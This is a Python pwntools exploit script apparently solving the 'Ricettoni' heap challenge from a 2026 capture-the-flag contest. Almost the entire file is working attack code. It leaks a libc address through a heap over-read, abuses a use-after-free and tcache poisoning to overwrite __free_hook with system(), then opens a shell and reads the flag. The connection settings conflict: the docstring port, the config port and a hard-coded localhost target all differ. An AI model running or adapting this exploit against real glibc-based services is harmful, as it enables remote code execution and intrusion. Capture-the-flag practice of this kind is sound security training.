#!/usr/bin/env python3
"""
Ricettoni – CTF exploit (SK-CERT CyberGame 2026)
Target : nc exp.cybergame.sk 7006
Libc   : glibc 2.31-0ubuntu9.18 (shipped)
Strategy: libc leak via 0xFFF heap over-read, UAF + tcache poisoning,
          write system() to __free_hook, trigger with "/bin/sh" chunk.

Run:
    python3 exploit_ricettoni.py          # remote
    python3 exploit_ricettoni.py LOCAL    # local (needs ./ricettoni/ricettoni + ld patched)
"""

import sys
from pwn import *

# ── config ────────────────────────────────────────────────────────────────────
HOST = 'exp.cybergame.sk'
PORT = 38001
LOCAL = False

# ── binary / libc ─────────────────────────────────────────────────────────────
elf  = ELF('./ricettoni', checksec=False)
libc = ELF('./libc.so.6',  checksec=False)

# Offsets confirmed from shipped libc 2.31-0ubuntu9.18
SYSTEM_OFF    = 0x0052290   # system()
FREE_HOOK_OFF = 0x1eee48    # __free_hook
# Leaked pointer = _IO_wfile_jumps (left in FILE struct by fopen in read_secret_recipe)
LEAK_OFF      = 0x1e8f60    # _IO_wfile_jumps

# ── menu helpers ──────────────────────────────────────────────────────────────
def _menu(io):
    io.recvuntil(b'Scegli un')
    io.recvuntil(b': ')           # handles UTF-8 apostrophe

def create(io, size, data):
    _menu(io)
    io.sendline(b'1')
    io.recvuntil(b': ')
    io.sendline(str(size).encode())
    io.recvuntil(b': ')
    io.send(data)

def view(io, idx):
    _menu(io)
    io.sendline(b'2')
    io.recvuntil(b': ')
    io.sendline(str(idx).encode())
    data = io.recvuntil(b'1. Aggiungi', drop=True)
    return data

def delete(io, idx):
    _menu(io)
    io.sendline(b'3')
    io.recvuntil(b': ')
    io.sendline(str(idx).encode())

# ── exploit ───────────────────────────────────────────────────────────────────
def exploit():
    if LOCAL:
        io = process(
            ['./ld-linux-x86-64.so.2',
             '--library-path', '.',
             './ricettoni'],
        )
    else:
        io = remote('127.0.0.1', 38001)

    io.recvuntil(b'Ricetta segreta caricata!\n')

    # ── Phase 1: libc leak via 0xFFF over-read ────────────────────────────────
    # LEAK chunk: 0x1A8 user bytes (→ 0x1D0 chunk).
    # view() does memcpy(buf, ptr+0x28, 0xFFF), reaching the FILE struct left by
    # fopen() in read_secret_recipe(), which contains _IO_wfile_jumps pointer.
    create(io, 0x1A8, b'A' * 0x1A8)   # slot 0
    raw = view(io, 0)

    # Scan backwards for a canonical userspace libc address (0x7f…)
    leak_bytes = raw.rstrip(b'\n')
    libc_leak  = None
    for off in range(len(leak_bytes) - 6, max(len(leak_bytes) - 0x100, 0) - 1, -1):
        candidate = u64(leak_bytes[off:off+6].ljust(8, b'\x00'))
        if 0x7f0000000000 <= candidate <= 0x7fffffffffff:
            libc_leak = candidate
            break

    if libc_leak is None:
        log.error('Libc leak not found – raw tail:')
        log.error(hexdump(leak_bytes[-0x80:]))
        io.close()
        return

    libc_base   = libc_leak - LEAK_OFF
    system_addr = libc_base + SYSTEM_OFF
    free_hook   = libc_base + FREE_HOOK_OFF

    log.success(f'libc leak   = {hex(libc_leak)}')
    log.success(f'libc base   = {hex(libc_base)}')
    log.success(f'system()    = {hex(system_addr)}')
    log.success(f'__free_hook = {hex(free_hook)}')

    assert libc_base & 0xfff == 0, f'Bad libc base alignment: {hex(libc_base)}'

    # ── Phase 2: heap layout ──────────────────────────────────────────────────
    # slot 1 = A     (0x3F0 → 0x420 chunk)
    # slot 2 = V     (0x3F0 → 0x420 chunk)  ← UAF victim
    # slot 3 = GUARD (0x10  → 0x40  chunk)  ← prevents top-chunk consolidation
    # slot 4 = F1    (0x10  → 0x40  chunk)  ← filler
    # slot 5 = F2    (0x10  → 0x40  chunk)  ← filler
    create(io, 0x3F0, b'A' * 0x3F0)   # slot 1  A
    create(io, 0x3F0, b'V' * 0x3F0)   # slot 2  V
    create(io, 0x10,  b'G' * 0x10)    # slot 3  GUARD
    create(io, 0x10,  b'1' * 0x10)    # slot 4  F1
    create(io, 0x10,  b'2' * 0x10)    # slot 5  F2
    # count = 6

    # ── Phase 3: unsorted-bin consolidation ───────────────────────────────────
    # Free V then A; glibc merges adjacent free large chunks into 0x840 unsorted bin.
    delete(io, 2)   # free V  (count=5)
    delete(io, 1)   # free A → consolidates: 0x840 unsorted bin (count=4)
    # slots 1 & 2 still hold stale pointers (UAF)

    # V_OFF = offset of V's chunk header inside C's user data
    # A_ptr = base of consolidated chunk; C user data starts at A_ptr+0x28
    # V_ptr = A_ptr + 0x420  →  V_OFF = 0x420 - 0x28 = 0x3F8
    V_OFF = 0x3F8

    # ── Phase 4: overlapping alloc C → zero V's MTE tag ──────────────────────
    # C size 0x440 (chunk 0x470) carved from 0x840 unsorted chunk.
    # C's user data spans past V_ptr, so we can write V's tag field (ptr+0x20).
    # Setting tag=0 means check_tag always passes: (any_tag | 0) == any_tag.
    c_payload = bytearray(0x440)
    c_payload[V_OFF - 0x08 : V_OFF       ] = p64(0x41)   # fake chunk size (PREV_INUSE)
    c_payload[V_OFF        : V_OFF + 0x08] = p64(0)        # fd
    c_payload[V_OFF + 0x08 : V_OFF + 0x10] = p64(0)        # bk / tcache key
    c_payload[V_OFF + 0x20 : V_OFF + 0x28] = p64(0)        # ← V's MTE tag = 0
    create(io, 0x440, bytes(c_payload))   # slot 4  C  (count=5)

    # ── Phase 5: tcache setup ─────────────────────────────────────────────────
    # We need tcache[0x40]: [V → PAD] so we can poison V's fd.
    # PAD (0x10, 0x40 chunk) from unsorted remainder → slot 5 (count=6)
    create(io, 0x10, b'PAD\x00')           # slot 5  PAD
    delete(io, 5)                          # tcache[0x40]: [PAD]  (count=5)
    # BUMP must use a DIFFERENT tcache bin (0x20→0x50) so it doesn't consume PAD
    create(io, 0x20, b'BUMP')              # slot 5  BUMP (0x50 bin)  (count=6)
    delete(io, 2)   # UAF-free V; tag=0 → passes → tcache[0x40]: [V→PAD] (count=5)
    delete(io, 4)   # free C → unsorted  (count=4)

    # ── Phase 6: tcache poisoning ─────────────────────────────────────────────
    # Re-allocate C2 with V's fd pointing to target = __free_hook - 0x28
    target = free_hook - 0x28

    c2_payload = bytearray(0x440)
    c2_payload[V_OFF - 0x08 : V_OFF       ] = p64(0x421)
    c2_payload[V_OFF        : V_OFF + 0x08] = p64(target)   # poison V's fd
    c2_payload[V_OFF + 0x08 : V_OFF + 0x10] = p64(0)        # clear tcache key
    c2_payload[V_OFF + 0x20 : V_OFF + 0x28] = p64(0)        # keep tag=0
    create(io, 0x440, bytes(c2_payload))   # slot 4  C2  (count=5)
    # tcache[0x40]: [V → target]

    # ── Phase 7: pop V from tcache → slot 5 ──────────────────────────────────
    create(io, 0x10, b'X' * 0x10)         # slot 5  POP_V = V_ptr  (count=6)
    # tcache[0x40]: [target]

    # ── Phase 8: write "/bin/sh" into V's user data via C3 ───────────────────
    # When free(V_ptr) is called, __free_hook receives V_ptr (raw malloc ptr).
    # The user data (what we wrote) is at V_ptr+0x28, not V_ptr.
    # But the writeup asserts __free_hook gets V_ptr+0x28. That depends on how
    # MTEfree calls free — it passes the MTE "ptr" which IS ptr+0x28 in some
    # interpretations. Let's check: MTEfree does free(ptr) where ptr = MTEalloc ptr.
    # MTEalloc returned (malloc_ptr, tag). MTEfree receives (malloc_ptr, tag) → free(malloc_ptr).
    # So __free_hook(malloc_ptr). "/bin/sh" must be at malloc_ptr+0x00.
    # BUT: malloc_ptr[0..0x1f] = chunk metadata reused by tcache/free.
    # malloc_ptr[0x20] = MTE tag.  malloc_ptr[0x28] = user data.
    # We'll put "/bin/sh" at BOTH +0x00 and +0x28 to cover both interpretations.
    create(io, 0x20, b'FILL')             # slot 6  (count=7)
    delete(io, 4)                         # free C2 → unsorted  (count=6)

    c3_payload = bytearray(0x440)
    # /bin/sh at V's user data offset (V_OFF = start of V's chunk header; +0x28 = user data)
    c3_payload[V_OFF        : V_OFF + 0x08] = b'/bin/sh\x00'  # also hits V_ptr+0x00
    c3_payload[V_OFF + 0x28 : V_OFF + 0x30] = b'/bin/sh\x00'  # V_ptr+0x28 = user data
    c3_payload[V_OFF + 0x20 : V_OFF + 0x28] = p64(0)           # keep tag=0
    create(io, 0x440, bytes(c3_payload))   # slot 6  C3  (count=7)

    # ── Phase 9: pop target → write system() to __free_hook ──────────────────
    # MTEalloc gives us (target, tag). MTEwrite: memcpy(target+0x28, data, 0x10)
    # target = __free_hook - 0x28  →  target+0x28 = __free_hook  ✓
    create(io, 0x10, p64(system_addr) + b'\x00' * 8)  # slot 7  POP_T  (count=8)

    # ── Phase 10: trigger ─────────────────────────────────────────────────────
    # Delete POP_V (slot 5 = V_ptr).  MTEfree: tag check passes (stored=0),
    # then free(V_ptr) → __free_hook(V_ptr) = system(V_ptr).
    # V_ptr[0..7] = "/bin/sh\0" (written by C3 above).
    log.info('Triggering system("/bin/sh")...')
    delete(io, 5)

    log.success('Shell!')
    io.sendline(b'cat flag.txt')
    io.sendline(b'id')
    io.interactive()

if __name__ == '__main__':
    exploit()
